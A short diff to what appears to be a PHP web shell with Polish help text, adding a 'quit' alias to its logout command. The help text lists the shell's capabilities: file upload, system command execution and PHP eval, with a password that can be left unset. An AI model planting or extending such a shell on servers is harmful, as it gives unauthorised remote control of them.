@@ -39,7 +39,7 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego katalogu\r\nversion - Wyświetlanie numeru wersji shella\r\nexit, logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego katalogu\r\nversion - Wyświetlanie numeru wersji shella\r\nexit, quit, logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -1268,7 +1268,7 @@ DATA;
 		if( $this -> bHelp )
 		{
 			return <<<DATA
-logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)
+exit, quit, logout - Wylogowanie z shella
 
 	Użycie:
 		logout
@@ -1541,8 +1541,9 @@ DATA;
 				case 'version':
 					$sConsole = $this -> getCommandVersion();
 					break ;
-				case 'logout':
 				case 'exit':
+				case 'quit':
+				case 'logout':
 					$sConsole = $this -> getCommandLogout();
 					break ;
 				case 'edit':
